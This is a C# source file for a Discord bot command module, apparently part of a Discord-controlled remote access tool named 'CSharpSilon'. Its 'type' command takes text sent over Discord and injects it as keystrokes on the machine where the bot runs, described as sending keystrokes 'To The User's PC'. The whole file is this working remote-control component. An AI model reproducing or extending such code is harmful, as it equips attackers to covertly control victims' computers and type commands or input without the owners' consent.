using System.Threading.Tasks;
using Discord.Commands;
using System.Windows.Forms;


namespace CSharpSilon.cmds
{
    public class KeyTyper : ModuleBase<SocketCommandContext>
    {
        [Command("type"), Alias("write", "typer", "typeout"), Summary("Sends Specified Keystrokes To The User's PC")]
        public async Task Typer([Remainder]string keys)
        {
            SendKeys.SendWait(keys);
            await ReplyAsync($"Typed Out: ```{keys}```");
        }
    }
}